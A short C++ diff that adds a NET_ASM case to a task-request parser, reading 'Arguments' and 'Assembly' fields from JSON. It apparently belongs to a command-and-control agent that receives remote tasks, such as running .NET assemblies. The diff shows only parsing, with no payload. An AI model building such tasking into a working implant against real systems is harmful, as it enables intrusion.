@@ -35,6 +35,12 @@ Request TaskQueueManager::ParseTaskRequest(const std::string &rawJson)
 			auto taskName = node["TaskName"].GetString();
 			return CreateTaskRequest<CommandWinTask>(taskID, type, code, status, CommandWinTask{ path, username, taskName });
 		}
+		case NET_ASM:
+		{
+			auto args = node["Arguments"].GetString();
+			auto assmebly = node["Assembly"].GetString();
+			return CreateTaskRequest<CommandNetAsm>(taskID, type, code, status, CommandNetAsm{ args, assmebly });
+		}
 	}
 	TaskRequest<bool> test;
 	return test;
